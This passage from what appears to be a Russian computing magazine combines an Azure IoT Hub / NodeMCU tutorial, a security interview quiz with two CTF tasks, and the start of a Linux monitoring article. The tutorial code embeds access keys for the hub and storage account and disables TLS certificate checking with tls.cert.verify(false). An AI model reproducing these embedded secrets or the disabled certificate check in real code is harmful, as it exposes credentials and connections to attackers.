   Первый способ, при котором SAS генерируется на устройстве, более
 простой и удобный, но чуть менее безопас ный, так как, получив дос туп
 к устройству, злоумышленник сможет добыть ключ и генерировать SAS
 устройства самостоятельно. Во вто ром случае взломщик сможет получать
 только SAS токены, время жизни которых огра ничено.
   Выходит, что оба способа по большому счету неидеальны, если у хакера
 есть доступ к устрой ству. Даже защита соединения с помощью VPN здесь
 не поможет. В таком случае канал передачи будет защищен, но тот, кому
 попадет в руки устрой ство, сможет получить и доступ к каналу. К сожалению,
 на устройствах NodeMCU, Arduino и подоб ных нет возможности хранить клю‐
 чи/пароли в каком‐либо безопас ном хранилище.


СОЗДАНИЕ AZURE-ФУНКЦИИ ДЛЯ ГЕНЕРАЦИИ SAS
 В  качестве  онлайн‐сервиса проще  всего исполь зовать  Azure‐функции.
 Это своеобразные сниппеты, которые можно писать сразу на портале Azure
 в браузере. Шутки шутками, но таким образом программировать можно даже
 со смартфона. Конечно, никто не запрещает соз давать и отлаживать их и из
 Visual Studio и только потом пуб ликовать в Azure уже в откомпилированном
 виде. Задача функции — выполнить какую‐то, как пра вило, не особо сложную
 операцию. По микросервисной задумке, каждая функция умеет делать что‐то
 одно, но зато очень хорошо (принцип Single responsibility).
   Создать Azure Function App мож но на портале, запол нив небольшую анке‐
 ту.





                     Создание Azure‐функции

 Consumption Plan позволяет платить только за те вызовы функции, которые
 были совершены. Это самый недорогой вариант. На данный момент миллион
 вызовов функции дается бесплатно. Заметь, что вмес те с функцией создает‐
 ся и вспомогательное хра нилище данных (Storage).
   После создания Function App мож но соз дать и саму функцию. В данном
 случае нам нужна функция типа Webhook + API. Функция может быть откры та
 всем (анонимный доступ), а может быть дос тупна только обладателям осо‐
 бого кода. Код можно получить из окна работы с функцией, нажав на ссылку >
 Get function URL.





                  Окно работы с Azure‐функцией

 Функции можно писать на раз личных язы ках. Я предпочитаю C#.


 using System.Net;
 using Microsoft.Azure.Devices;
 using Microsoft.Azure.Devices.Common.Security;
 using System.Globalization;
 using System.Security.Cryptography;
 using System.Text;
 public static async Task<HttpResponseMessage> Run(HttpRequestMessage
 req, TraceWriter log)
 {
     string deviceid = req.GetQueryNameValuePairs()
                 .FirstOrDefault(q => string.Compare(q.Key, "deviceid"
 , true, CultureInfo.InvariantCulture) == 0).Value;
     string hash = req.GetQueryNameValuePairs()
                 .FirstOrDefault(q => string.Compare(q.Key, "hash",
 true, CultureInfo.InvariantCulture) == 0).Value;
     if (String.IsNullOrEmpty(deviceid)) return req.CreateResponse(
 HttpStatusCode.BadRequest, "device id missing");
     if (String.IsNullOrEmpty(hash)) return req.CreateResponse(HttpSt
 atusCode.BadRequest, "hash missing");
     var resourceUri ="ArduinoDemoHub.azure‐devices.net/devices/"+
 deviceid;
     // taken from IoT Hub user with Connect devices rights (not from
 Device Explorer)
     var connectionString = "HostName=ArduinoDemoHub.azure‐devices.
 net; SharedAccessKeyName=iothubowner; SharedAccessKey=cuYBKc42lfJr4oS
 RGQGQ8IiKWxGQkLre7rprZDZ/ths=";
     var registryManager = RegistryManager.CreateFromConnectionString(
 connectionString);
     var device = await registryManager.GetDeviceAsync(deviceid);
     var key = device.Authentication.SymmetricKey.PrimaryKey;
     HMACSHA256 hmac = new HMACSHA256(Encoding.UTF8.GetBytes("somera
 ndomkeyKJBWyfy4gski"));
     var hashedkey = Convert.ToBase64String(hmac.ComputeHash(Encoding.
 UTF8.GetBytes(key)));
     if (hashedkey!=hash) return req.CreateResponse(HttpStatusCode.
 BadRequest, "wrong hash");
        SharedAccessSignatureBuilder sasBuilder = new SharedAccessSig
 natureBuilder()
         {
             Key = key,
             Target = resourceUri,
             TimeToLive = TimeSpan.FromDays(Convert.ToDouble(7))
         };
         var SAS = sasBuilder.ToSignature();
         return req.CreateResponse(HttpStatusCode.OK, SAS);
 }

 Создаем файл project.json и добавляем в него следующее содержимое:


 {
     "frameworks": {
         "net46": {
             "dependencies": {
                 "Microsoft.Azure.Devices": "1.4.1"
             }
         }
     }
 }

 В коде используется строка подключения к IoT‐хабу. Ее можно спутать
 со строкой подклю чения к устройству. На всякий случай напомню, где ее
 можно взять.





                      Ключ дос тупа к IoT‐хабу

 Необходимо взять Connection string из какого‐нибудь Policy с правами Device
 connect. Саму строку подключения лучше не ука зывать в коде, как сделал я
 (это исключительно ради примера). Лучше всего зай ти в Application settings
 функции.





       Страница настроек, на которой можно най ти Application settings

И указать там строку подключения. После это го ее можно «дос тавать»
 из безопасного хранилища с помощью


 ConfigurationManager.ConnectionStrings["Имя_твоей_строки_подключения"
 ].ConnectionString

 На устройстве нам необходимо сохранить hashedkey. Но предварительно
 нужно энкодировать эту строку, поскольку отправлять запрос будем через
 Get, и не все символы могут присутствовать в зна чении параметра. Поможет
 нам HttpUtility.UrlEncode из прос транс тва System.Web:


 hashedkey = HttpUtility.UrlEncode(hashedkey);




                                      Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
  ПРЫЖОК В ОБЛАКО
                 СТРОИМ БЮДЖЕТНОЕ РЕШЕНИЕ
                        ДЛЯ ИНТЕРНЕТА ВЕЩЕЙ
                     НА NODEMCU + AZURE IOT HUB





НАПИСАНИЕ КОДА ДЛЯ ОТПРАВКИ ДАННЫХ В ОБЛАКО
Я написал небольшой код на Lua, отправляющий данные в облако. Получился
своеобразный PoC. Можешь его использовать и дорабатывать под свои нуж‐
ды.
  Создаем два файла: init.lua и SendDataToCloud.lua. Содержимое первого:


‐‐ Информация об устройстве
print('init.lua ver 1.2')
wifi.setmode(wifi.STATION)
print('set mode=STATION (mode='..wifi.getmode()..')')
print('MAC: '..wifi.sta.getmac())
print('chip: '..node.chipid())
print('heap: '..node.heap())
‐‐ Настройка Wi‐Fi
station_cfg={}
station_cfg.ssid="Твой_SSID"
station_cfg.pwd="Пароль_твоей_точки_доступа"
station_cfg.save=false
wifi.sta.config(station_cfg)
wifi_status_codes = {
    [0] = "Idle",
    [1] = "Connecting",
    [2] = "Wrong Password",
    [3] = "No AP Found",
    [4] = "Connection Failed",
    [5] = "Got IP"
}
sntp_connect_status_codes = {
    [1] = "DNS lookup failed",
    [2] = "Memory allocation failure",
    [3] = "UDP send failed",
    [4] = "Timeout, no NTP response received"
}
‐‐ Ждем подключения к Wi‐Fi (совершаем попытки каждую секунду)
tmr.alarm(6,1000, 1, function()
    if wifi.sta.getip()==nil then
        print("Waiting for IP address! (Status: "..wifi_status_codes[
wifi.sta.status()]..")")
    else
        print("New IP address is "..wifi.sta.getip())
        tmr.stop(6)
    ‐‐ Синхронизируем часы с NTP
    sntp.sync({'pool.ntp.org'},
      function(sec, usec, server)
        print("Clock Synced: "..sec..", "..usec..", "..server)
        tls.cert.verify(false)
        ‐‐ Выполняем следующий файл
        dofile('SendDataToCloud.lua')
      end,
      function(error_code)
        print("Clock Sync Failed: "..sntp_connect_status_codes[error_
code])
      end,
      1 ‐‐ Повторяем синхронизацию в случае ошибки
    )
    end
  end
)

Этот файл совер шает подключение к сети и выполняет код из файла Send‐
DataToCloud.lua  в  случае успешного подклю чения. Необходимо  указать
в качестве значений station_cfg.ssid и station_cfg.pwd данные точки доступа
Wi‐Fi.
  В следующем файле надо изменить имя устройства и IoT‐хаба (перемен‐
ные DEVICE и IOTHUB). В переменной funcurl указан адрес генерирующей
SAS функции и в качестве зна чения параметра hash указан хеш ключа девай‐
са   (который   мы   предварительно   закодировали   с   помощью
HttpUtility.UrlEncode).


‐‐ Конфигурация
DEVICE = "LuaDevice"
IOTHUB = "ArduinoDemoHub.azure‐devices.net"
PORT   = 8883
USER   = "ArduinoDemoHub.azure‐devices.net/"..DEVICE.."/
api‐version=2016‐11‐14"
telemetry_topic="devices/"..DEVICE.."/messages/events/"
connected = false
local headers =
        'Content‐Type: application/x‐www‐form‐urlencoded\r\n'..
        'Accept: */*\r\n'..
        'User‐Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.
0) Gecko/20100101 Firefox/47.0'
funcurl = "https://arduinofunction.azurewebsites.net/api/Genera
teSASFunction?code=Jn7j54PbR31BSRa0UZrDwp4ZEltjmWHmblG9zLo0Ne0tyGM7w/
wQ7w=="
funcurl = funcurl.."&hash=oJzykimyQsTPtzgJxYq90Xfqmw1rZTPTCH%2bJ5sS
urKI%3d"
funcurl = funcurl.."&deviceid="..DEVICE
tmr.alarm(1,5000, 1, function()
http.get(funcurl, headers,
   function(code, data, header)
     if (code < 0) then
      print("HTTP request failed")
    else
    sas = true
      print(code, data)
       if string.match(data, "Shared") then
         tmr.stop(1)
         SAS = string.sub(data,2,string.len(data)‐1)
         print(SAS)
         connect(SAS)
       end
    end
   end)
  end)
function connect(SAS)
‐‐ Создаем клиент MQTT
client = mqtt.Client(DEVICE, 240, USER, SAS)
‐‐ Подключаемся к IoTHub с помощью протокола MQTT
print ("Connecting to MQTT broker. Please wait...")
   tmr.alarm(2,1000, 1, function()
     client:connect(IOTHUB, PORT, 1,
    ‐‐ Callback в случае успешного подключения
    function(client)
        tmr.stop(2)
        print("Connected to MQTT: "..IOTHUB..":"..PORT.." as "..
DEVICE)
        connected = true
        senddata()
    end,
    ‐‐ Callback в случае ошибки
    function(client, reason)
        print("Error Connecting: "..reason)
    end
           )
  end)
end
function senddata()
    math.randomseed(1)
    tmr.alarm(3, 1000, tmr.ALARM_AUTO, publish_data)
    ‐‐ Если вдруг отключимся, то будет выполнен следующий callback
    client:on("offline", function(client)
        print("MQTT Disconnected.")
        connected = false
    end)
end
‐‐ Функция, отправляющая данные в облако
function publish_data()
    if connected == true then
        somedata =  math.random(1,100)
        ‐‐ Подготавливаем данные для отправки
        payload =
            "{ \"deviceId\" : \""..DEVICE.."\","..
            "\"iotdata\" :"..somedata.."}"
        ‐‐ Отправляем данные
        client:publish(telemetry_topic, payload, 1, 0, function(
client)
            print("Data published successfully.")
        end)
    end
end

Данные отправляются без использования Azure SDK, так что можешь при‐
менять этот код не только для отправки данных именно в Azure. Альтернатив
достаточно много: AWS, Google Cloud IoT, IBM Watson IoT Platform.
  В примере исполь зует ся протокол MQTT (Message Queuing Telemetry
Transport). Это открытый про токол, который разработан специально для IoT‐
устройств. Данные отправляются в формате JSON. Там, где в реальных про‐
ектах данные снимаются с дат чиков, в примере генерируется слу чайное чис‐
ло. Во время процесса handshake между устрой ством и IoT‐хабом сервер
может отправить свой сертификат, а может запросить сертификат устрой‐
ства. Если помнишь, то в прошлый раз при работе с Arduino‐девайсом мы
прошивали его сертификатом. Сейчас же достаточно одной строки кода:


tls.cert.verify(false)

Ограничиваемся сертификатом, который отправит нам сервер.


             INFO

                    Содержимое сертификатов хаба можно получить
                        с помощью следующей коман ды OpenSSL:

                     openssl s_client ‐showcerts ‐connect
                     ArduinoDemoHub.azure‐devices.net:8883



РАБОТАЕМ С NODEMCU ИЗ ARDUINO IDE
Не могу обойти стороной тему использования SDK. Свое решение, конечно,
хорошо, но SDK — это тот же самый код, который уже отлажен, упрощен
и готов для использования. Нес колько слов о том, как настроить и исполь‐
зовать Arduino IDE для работы с NodeMCU. Пос ле установки Arduino IDE нуж‐
но зайти в меню File → Preferences.





                      Нас трой ки Arduino IDE

И добавить ссылку на дополнитель ный менеджер плат — ввести в поле Addi‐
tional Boards Manager URLs адрес


http://arduino.esp8266.com/versions/2.4.0/package_esp8266com_index.
json

Затем зайти в меню Tools → Board xxx → Boardx Manager и установить
ESP8266.
   Устанавливаем  библиотеки  AzureIoTHub,  AzureIoTUtility,  AzureIoTProto‐
col_MQTT. После установки последней биб лиотеки в примерах (меню File →
Examples → AzureIoTProtocol_MQTT) можно най ти пример simplesample_mqtt
для ESP8266. Пример готов к работе. Дос таточно только заполнить значения
переменных в файле iot_conﬁgs.h.
   Упомяну об одном небольшом минусе. Компиляция проекта и загрузка
на плату, по сравнению с Lua, занимает довольно долгое вре мя.


СОХРАНЕНИЕ ДАННЫХ В ОБЛАКЕ AZURE
С отправкой данных все понятно, но как недорого сохранить данные в обла‐
ке? Самый экономный на сегодняшний день способ отправить данные из IoT‐
хаба в базу данных — все те же Azure Functions. А самое недорогое хранили‐
ще данных — Azure Table Storage.


             INFO

                       Всегда советую при  использовании облачных
                       сервисов  от любого провайдера привязывать
                          к аккаунту карту с минимально необходимой сум‐
                    мой на счету. Тогда тебе не придется распла‐
                        чиваться большими деньгами за какую‐нибудь
                    ошиб ку в коде.


Интересно, что при создании Function App авто матичес ки соз дается и Stor‐
age, который необ ходим самой функции для работы. Если ты создаешь
отдельное хранилище, то основные нас трой ки желательно сделать примерно
такими:





                    Создание Storage account

LSR‐репликация — это самый недорогой на данный момент вари ант. Он
выбирается при автоматическом соз дании хранилища, привязанного к фун‐
кции.
  Сейчас нам нужно получать данные от IoT‐хаба и записы вать их в хранили‐
ще. Для этого случая окошко Quick Start при соз дании функции нужный нам
вариант предложить не сможет.





             Создание Azure‐функции — окно Quick Start

Поэтому нажимаем ссылку Custom function, рас положенную внизу, и выбира‐
ем вариант IoT Hub (Event Hub). Здесь нам откро ется такое окошко:





              Создание функции для работы с IoT‐хабом

Поле Event Hub connection мы можем заполнить простым выбором (нажав
new). А вот чтобы указать Event Hub name, необ ходимо зайти в IoT‐хаб,
в хабе — в Endpoints (конечные точки) и взять отту да Event Hub‐compatible
name.





            Получение имени, совместимого с Event Hub

Перейдем к коду функции. Следующий сниппет получает данные из IoT‐хаба
и сохраняет в Table Storage:


#r "Microsoft.WindowsAzure.Storage"
#r "Newtonsoft.Json"
using Microsoft.Azure; // Namespace for CloudConfigurationManager
using Microsoft.WindowsAzure.Storage; // Namespace for CloudS
torageAccount
using Microsoft.WindowsAzure.Storage.Table; // Namespace for Table
storage types
using Newtonsoft.Json;
public static void Run(string myIoTHubMessage, TraceWriter log)
{
var e = JsonConvert.DeserializeObject<EventDataEntity>(myIoTH
ubMessage);
log.Info($"C# IoT Hub trigger function processed a message: {myIoTH
ubMessage}");
CloudStorageAccount storageAccount = CloudStorageAccount.Parse
 ("DefaultEndpointsProtocol=https;AccountName=iotdatademostorage;
AccountKey=JgStNcJvlQYeNsVCmpkHQUkWlZiQ7tJwAm6OCL34+lGx3XrR+0CPiY9
RoxIDA6VSvMKlOEUrVWL+KWP0qLMLrw==;EndpointSuffix=core.windows.net");
CloudTableClient tableClient = storageAccount.CreateCloudTableClient
();
CloudTable table = tableClient.GetTableReference("iottable");
table.CreateIfNotExists();
EventDataEntity edata = new EventDataEntity("IOTpartition", Guid.
NewGuid().ToString());
edata.DeviceId = e.DeviceId;
edata.IotData = e.IotData;
TableOperation insertOperation = TableOperation.Insert(edata);
table.Execute(insertOperation);
}
public class EventDataEntity : TableEntity
{
    public EventDataEntity(string pkey, string rkey)
    {
        this.PartitionKey = pkey;
        this.RowKey = rkey;
    }
    public EventDataEntity() { }
    public string DeviceId { get; set; }
    public int IotData { get; set; }
}

Если ты будешь исполь зовать этот код в реаль ном проекте, то не забудь
вынести строку подклю чения в более безопас ное место — в App settings (точ‐
но так же, как и строку подключения первой функции). Саму строку подклю‐
чения можно взять в пункте нас троек под наз вани ем Access keys.





                    Ключи доступа к данным

Просматривать содержимое таб лиц можно с помощью бесплатной утилиты
Azure Storage Explorer. Так как стоимость Azure Table Storage довольно низкая,
а Azure Functions и IoT‐хаб предлагают определенные ресурсы ежемесячно
бесплатно, то все решение в месяц может обойтись меньше чем в дол лар.
Конечно, это зависит от количес тва данных. Считай сам: на сегодняшний
момент 1 Гбайт данных стоит 7 центов в месяц и за каждый мил лион тран‐
закций с тебя возьмут 4 цента.


        WWW

                     Для подготовки материала использовались лабы,
                       которые доступны по ссылке: Sending Device‐to‐
                        Cloud (D2C) Messages. Код уже не совсем акту‐
                        альный, и пришлось его немного обно вить, но в
                     целом ссылка может оказаться полезной.
КОДИНГ

ЗАДАЧИ
 НА СОБЕСЕДОВАНИЯХ


       ОТ ХАКЕРОВ — ХАКЕРАМ:
         ЗАДАЧИ ОТ HACKERU





                                      Александр Лозовский
                                                     lozovsky@glc.ru





Давненько мы не балова ли тебя задачами на собеседова‐
ниях. Пора исправляться! Сегодня квесты представляют
наши в некотором роде коллеги — Высшая школа информа‐
ционной  безопасности. Занимаются  они,  как  нетрудно
догадаться, профессиональной подготовкой частных лиц
и компаний, стремящихся при обрести необходимые навыки
и опыт в области ИТ и ИБ.


IT-ком пании, шли те нам свои задач ки!
Миссия этой мини‐рубрики — образовательная, поэтому мы бесплатно пуб‐
ликуем качественные задачки, которые различные компании предлагают
соискателям. Вы шлете задачки на lozovsky@glc.ru — мы их публикуем.
Никаких актов, договоров, экспертиз и отчетностей. Читателям — задачки,
решателям — подарки, вам — рес пект от нашей многосоттысячной ауди‐
тории, пиарщикам — строчки отчетнос ти по публикациям в топовом компь‐
ютерном журнале.


Кратко напоминаю фор мат: компания пуб лику ет задачи, читатели их решают
и присылают правильные ответы, за что получают призы, а иногда еще и дол‐
жности (прав да, на моей памяти час то выходило так, что задачки быстрее
всех решали парни, которые уже имели хорошие должности и менять работу
не торопились :)).
  Сегодняшнее задание сос тоит из десяти не очень сложных тес товых воп‐
росов, определяющих твой кругозор, и двух реаль ных хакерских заданий.
Поехали!


ДЕСЯТЬ ВОПРОСОВ
1. При каком варианте спама зло умыш ленники вынуж дены ука-
зывать настоящий обратный адрес?
 1. Фишинговые письма.
 2. Нигерийские письма.
 3. Малотиражная целевая спам‐рассылка с вредоносным вложением.

2. Воз можна ли утеч ка дан ных пользовате ля, если он вво дит их
с виртуальной клавиату ры?
 1. Нет.
 2. Нет, если на компьютере заклеена видеокамера.
 3. Да.

3. Выберите все из перечисленных ниже проб лем, которые уда-
ется решить с помощью технологии соления паролей:
 1. Выбор слишком короткого пароля.
 2. Неинформативность пароля.
 3. Совпадение паролей у разных пользователей.

4. Какая из перечисленных ниже вре доносных программ пред-
назначена для атак на онлайн‑бан кинг?
 1. Chameleon.
 2. Virus.Win9x.CIH.
 3. Carberp.

5. Какой вид атак на онлайн‑бан кинг технически наибо лее слож-
ный и тре бует внед рения на атакуемом информацион ном ресурсе
экспло ита?
 1. Phishing.
 2. Man‐in‐the‐Middle.
 3. Man‐in‐the‐Endpoint.

6. В чем слабое место про токо ла Диффи — Хел лмана?
 1. Математическая осно ва этого протокола ненадежна.
 2. Уязвим по отношению к атакам Man‐in‐the‐Middle.
 3. Стал уязвим по отно шению к brute‐force attack с учетом выросших вычис‐
   лительных возможнос тей компьютеров.

7. Какой метод DDOS-атаки поз воляет добиться мно гок ратно го
усиления трафика?
 1. UDP ﬂood.
 2. Http slow post.
 3. Dns ampliﬁcation атака.

8. Какой хеш‑алго ритм работает быстрее?
 1. CRC32.
 2. MD5.
 3. SHA‐2.

9. Какие криптографические методы используются в технологии
блок чейн?
 1. Потоковое шифрование.
 2. Хеширование.
 3. Цифровая подпись.

10. Выберите все правильные варианты отве та:
 1. Формат HTTPS разработан специально для нужд онлайн‐банкинга.
 2. HTTPS является отдельным по сравнению с HTTP протоколом.
 3. HTTPS — это расширение протокола HTTP, в котором добавлено шиф‐
   рование передаваемых по транспортным механиз мам протокола HTTP
   данных.


ХАКЕРСКИЕ ЗАДАНИЯ
Задание 1
На рабочем компьютере секретного агента была найдена подозрительная
программа, которая крадет данные. Агент не растерялся и снял дамп прог‐
раммы непосредственно перед отправкой зашифрованных данных. Пароль
на архив: infected.
   Требуется: найти флаг.


Задание 2
В вашем распоряжении ока залась зашифрованная информация в файле
ﬂag.enc. Данный файл зашифрован алгоритмом AES‐256‐ECB. К счастью,
у вас есть ключ от зашифрованного файла key.enc. Проблема в том, что он
зашифрован алгоритмом RSA публичным ключом key.pub.
   Требуется: расшифро вать файл flag.enc и достать флаг.


ПРИЗЫ И ПОДАРКИ
Ответы присылай Екатерине Плот никовой: ep@smcomm.ru.
   Главный приз будет разыгран рандомно среди участников, правильно
решивших все задания. Победитель получит от HackerU стипендию на сум‐
му 100 тысяч рублей. Она полностью покроет расходы на прохождение отбо‐
рочного курса (20 академических часов), а также часть основного 9‐месяч‐
ного курса по освоению про фессии пен тесте ра, после успешного про‐
хождения которого HackerU гарантирует трудоустройство по специальности.
  Прославлять победителей мы будем через месяц, поименно :). А после
того, как из трубы над редакцией поднимет ся белый дым, который ознамену‐
ет назначение победителя, товарищи из HackerU планиру ют распределить
среди участников еще несколько небольших подарочков (в виде промоко‐
дов).
АДМИН
НАДЗИРАЙ
 И ВЛАСТВУЙ
    КАК УЗНАТЬ ВСЕ, ЧТО ПРОИСХОДИТ
      С ТВОЕЙ LINUX‐МАШИНОЙ





                                         Николай enchantner
                                            Марков
                                                 enchantner@gmail.com





Ты уверен, что в курсе всего про исходящего у тебя в сис‐
теме? Воз можно, ты даже пользуешься какой‐то системой
мониторинга наподо бие Prometheus или Zabbix, но знаешь
ли ты, как самому получить подробные отчеты о работе сис‐
темы и железа? В этой статье мы расска жем, как, используя
командную строку Linux и стандартные утилиты, доступные
в любом  дис трибутиве,  выжать  максимум информации
о работе системы.


САМ СЕБЕ БОЛЬШОЙ БРАТ
Что вообще такое «монито ринг»? Пос кольку я в свое время оканчивал
химический университет, у меня это понятие четко ассоциируется с сис‐
темами управле ния технологичес кими производс твами. По сути, у нас есть
ряд параметров сложной системы, которые мы отслеживаем, а по резуль‐
татам можем, если необ ходимо, выполнить управляющее воздействие. Нап‐
ример, понизить давление в реакторе. А еще мы можем отправить уведом‐
ление оператору, который уже независимо примет то или иное управляющее
решение.
   У тех, кто далек от химии, но близок к IT, ассо циация немного другая, но в
целом похожая — обычно это экран с кучей графиков, на которых творится
какая‐то магия, как в голливудских сериалах. Для многих администраторов
так оно и выглядит — Graphite/Icinga/Zabbix/Prometheus/Netdata (нужное под‐
черкнуть) как раз рисуют красивый интерфейс, в который можно задумчиво
глядеть, почесывая бороду и гладя свитер.
   Большинство  этих сис тем работа ют одинаково: на  конечные  ноды,
за которыми мы хотим наблюдать, устанавлива ются так называемые агенты,
или коллекторы, а дальше все происходит по методике push или pull. То есть
либо мы указываем этому агенту мастер‐ноду, и он начинает периодически
отсылать туда отчеты и heartbeat, либо же, наоборот, мы добавляем ноду
в список для мониторинга на мастере, а тот уже, в свою оче редь, сам ходит
и опрашивает агенты о текущей ситуации.
   Нет, я не буду расска зывать в подробнос тях, как настраивать подобные
системы. Вместо это го мы голыми руками докопаемся до того, что вообще
происходит в системе. Кстати, хороший перечень утилит для сисадмина при‐
веден в статье Евгения Зобнина «Сисадминский must have». Настоятельно
советую взглянуть.


СРЕДНЯЯ ТЕМПЕРАТУРА ПО БОЛЬНИЦЕ
Об одной из самых базовых метрик часто рассказыва ют на первых же заняти‐
ях по Linux даже в школах. Это всем известный uptime, он же вре мя непрерыв‐
ной работы системы с момента последней перезагрузки. Утилита для его
измерения называется точно так же и выдает целую строчку полезной
информации:


$ uptime
13:43 up 9 days, 9:23, 2 users, load averages: 0.01 0.04 0.01

В начале идет текущее время, потом собственно аптайм, потом количество
залогинившихся в систему пользователей, а дальше показатели load average,
те самые таинственные три цифры, о которых часто спрашивают на собесе‐
дованиях. Кстати, есть еще команда w, которая выдает ту же самую строчку
плюс чуть более подробную информацию о том, что каждый из юзеров дела‐
ет.
  Информацию об uptime мож но пос мотреть напрямую в /proc, только
в таком случае она будет слег ка менее интерпретиру емой:


$ cat /proc/uptime
5348365.91 5172891.73

Здесь первое число — это сколько секунд система работала с момента стар‐
та, а второе — сколько из них она работа ла «вхо лостую», не делая толком
ничего.
  Но давай остановимся подробнее на load average, ибо тут есть один под‐
вох. Еще раз взглянем на числа, в этот раз вос пользовавшись интерфейсом /
proc (числа те же самые, раз личается только способ):


$ cat /proc/loadavg
0.01 0.04 0.01 1/2177 27278

Тебе не составит труда найти информацию, что в UNIX‐сис темах эти числа
означают усредненное количество про цес сов, стоящих в очереди за ресур‐
сами CPU, причем взятые в трех временных периодах до текущего момента:
1 минуту, 5 минут и 15 минут назад. Дальше, чет вертая колонка — это раз‐
деленные слешем количество процес сов, выполняющихся в системе сейчас,
и количество процессов в системе вообще, а пятая — последний выданный
системой PID. Так где же здесь подвох?
  А подвох в том, что это верно для UNIX, но не для Linux. С виду все нор‐
мально: если числа умень шаются — нагрузка снижается, если уве личивают‐
ся — растет. Если ноль — система простаивает, если равна чис лу ядер —
значит, загрузка под 100%, если в выводе десят ки и сотни… стоп, что? Фор‐
мально Linux учитывает не только процессы в статусе RUNNING, но и процес‐
сы, находящиеся в UNINTERRUPTIBLE_SLEEP, то есть висящие на вызовах
в ядро. Это значит, что на эти числа могут также оказывать влияние I/O‐опе‐
рации, да и далеко не только они, потому что вызовы в ядро не ограничивают‐
ся I/O. Пожалуй, я здесь остановлюсь, а за подробнос тями рекомендую прос‐
ледовать вот в эти две статьи: «Как считается Load Average», «Load Average
в Linux: разгадка тайны».

ФАЙЛЫ, КОТОРЫХ НЕТ
Если говорить совсем откро венно, в Linux основным источником информации
как о процессах, так и о железе служит именно фай ловая виртуальная фай‐
ловая система procfs (/proc), а также sysfs (/sys). И у них довольно
богатая и интересная история.
  Дело в том, что одно из официальных положений идеологии UNIX гласит:
«Всё есть файл», то есть взаимо действие с любым системным компонентом
теоретически должно вестись через реальный или виртуальный файл, дос‐
тупный через обычное дерево каталогов. Эту идею до абсолюта довели в нас‐
леднике UNIX под названием Plan 9, где все процес сы превратились в катало‐
ги и взаимодействовать с ними можно было даже пос редством команд cat
и ls, поскольку они были тексто выми. Именно так появилась файловая сис‐
тема procfs, которая позже перекочевала в Linux и BSD.
   Но, как и в случае с load average, конкретно в Linux есть свои тонкости (это
я так политкорректно называю адскую кашу‐малашу). Например, линуксовый
/proc, вопреки названию, с самого начала был уни версальным интерфейсом
получения информации от ядра в целом, а не толь ко от процес сов. Более
того, именно взаимодействовать с процессами через эту систему практичес‐
ки не получается, толь ко извлекать информацию по их PID’ам.
  С течением времени в /proc появлялось все больше и больше файлов,
содержащих информацию о самых раз ных подсистемах ядра, железе и мно‐
гом другом. В конечном итоге он превратился в помойку, и разработчики
решили вынести информацию хотя бы о железе в отдельную фай ловую сис‐
тему, которую к тому же можно было бы исполь зовать для формирования
каталога /dev. Так и появилась /sys со своей странной структурой катало‐
гов — ее трудно разгребать вручную, но она очень удобна для автоматичес‐
кого анализа другими приложениями (такими как udev, который и формирует
содержимое катало га /dev на основе информации из /sys).
  В итоге куча информации до сих пор дублируется в /proc и /sys просто
потому, что, если выкинуть файлы из /proc, можно сломать некоторые фун‐
даментальные  системные  компоненты  (легаси!),  которые  до  сих  пор
не переписаны.
   Ну а еще есть /run, конечно же. Это файловая система, которая монтиру‐
ется одной из первых и служит перева лочным пунктом для данных рантайма
основных системных демонов, в час тности udev и systemd (о нем поговорим
отдельно чуть позже). Кста ти, сам проект udev в 2012 году влился в systemd
и дальше развивается как его часть.
  В общем, как писал Льюис Кэрролл, «все чудесатее и чудесатее».
   Ну и ссылочки почитать: Procfs and sysfs и «Фай ловая система /proc».


Но вернемся к нашим замерам. Для того чтобы смотреть, какие PID прис‐
воены процессам, есть команды pidstat и htop (из одноименного пакета,
более продвинутая версия top, заодно показывает чертову прорву всего, ана‐
лог графического диспетчера задач).
  Кроме того, команда time поз воляет запус тить процесс, попутно измерив
время его выполнения, точнее, целых три времени:


$ time python3 ‐c "import time; time.sleep(1)"
python3 ‐c "import time; time.sleep(1)" 0.04s user 0.01s system 4%
cpu 1.053 total

Как выше я уже проговорился, любая прог рамма может проводить разное
время в kernel space и user space, то есть выполняя вызовы в ядро или свой
собственный код. Поэто му при базовом взгляде на эти цифры можно
в некоторых случаях уже сделать вывод об узком месте в программе: если
первый показатель силь но выше, то, вполне воз можно, затык в I/O, а если
второй —  то, возможно, в коде есть неэффективно написанные куски,
которые стоит запрофилировать подробнее.
  А вот третье время, total time, оно же wall clock time или real time, —
это время, которое реально заняло выполнение программы с момента запус‐
ка до момента возврата управления. Кста ти, user time может быть сильно
больше real time, потому что оно рассчитывается как сумма по всем ядрам
CPU. Если такое происходит — зна чит, программа неп лохо парал лелится.
   Ну и напоследок, чтобы посмотреть загрузку для каждого ядра в отдель‐
ности, можно исполь зовать вот такую команду:


$ mpstat ‐P ALL 1

Если будут сильные перекосы в загрузке ядер — значит, какая‐то из прог‐
рамм, напротив, параллелит ся крайне плохо. А еди ничка значит «обновляй‐ка
раз в секунду».


ПОЛУЧШЕ, ЧЕМ У ЗОЛОТОЙ РЫБКИ
Что в науке, что в инжи ниринге периодически воз никает одна и та же «проб‐
лема» — нельзя просто так взять и ответить на, казалось бы, простой вопрос.
Все потому, что есть нюансы и тонкости, а задающий вопрос человек начина‐
ет злиться и говорить: «Не надо мне это го всего, ты мне циф ру назови».
А потом зависает, когда внезапно ока зывается, что разные утилиты показы‐
вают абсолютно разные значения, ска жем, для размера файла или для
количества доступной оперативки…
   Кстати, об оперативке. Поскольку это у нас железо, то мы можем первым
делом опять нахально прос ледовать в /proc:


$ cat /proc/meminfo

…и получить кучу разных цифр, из которых большая часть абсолютно непонят‐
на, так как это вооб ще все параметры нашей RAM, которые видит ядро.
Поэтому лучше все‐таки использовать старую добрую команду free:


$ free ‐ht





Кстати, почему мы получаем информацию об оперативке не из /sys, как я
описал во врезке? Да потому что «пошел ты, вот почему». Вот ссыл ка
на заметочку, в которой написано, где там память в /sys и как с ней работать:
How memory is represented in sysfs. Если кратко — придется перемножать
в уме и читать кучу разных файлов.
   Как ни странно, есть возможность получить и более низкоуровневую
информацию об оперативке, чем /proc/meminfo. Это утилита dmidecode
из одноименного пакета. Она общается непосредственно с BIOS и воз вра‐
щает даже имена вендоров‐про изво дителей. Правда, не всегда верные (осо‐
бенно весело запускать ее под гипервизором, но это совсем другая исто‐
рия).


$ sudo dmidecode ‐‐type 17





Кстати, top и htop, как и банальный ps  aux, тоже выводят информацию
о занятой памяти, а второй еще и диаграмму в ASCII рисует по ней и по
ядрам. Цветную. Лепота.




